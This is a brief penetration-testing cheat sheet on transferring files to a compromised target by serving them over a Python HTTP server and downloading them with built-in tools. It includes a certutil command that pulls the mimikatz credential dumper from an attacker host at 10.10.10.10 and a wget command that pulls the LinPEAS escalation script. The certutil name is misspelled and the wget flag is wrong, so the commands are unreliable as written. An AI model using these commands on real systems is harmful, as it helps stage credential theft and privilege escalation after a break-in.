# Transferring Files to Target

After gaining initial access to a system, we'll almost always need to transfer files over. And sometimes, we won't have access to a Meterpreter shell and as a result, we will learn to live off the land. We have to learn how to use existing binaries to upload and download files and binaries.

#### SET UP A PYTHON HTTP SERVER:

```sh
python2 -m SimpleHTTPServer [PORT]
python3 -m http.server [PORT]
```

#### TRANSFERRING FILES TO WINDOWS TARGETS:

```sh
certuitl -urlcache -f http://10.10.10.10/mimikatz.exe C:/tmp/mimikatz.exe
```

#### TRANSFERRING FILES TO LINUX TARGETS:

```sh
wget http://10.10.10.10/LinPEAS.sh -o /tmp/LinPEAS.sh
```

Use the Temp directory to store all the files that we transfer to the target.
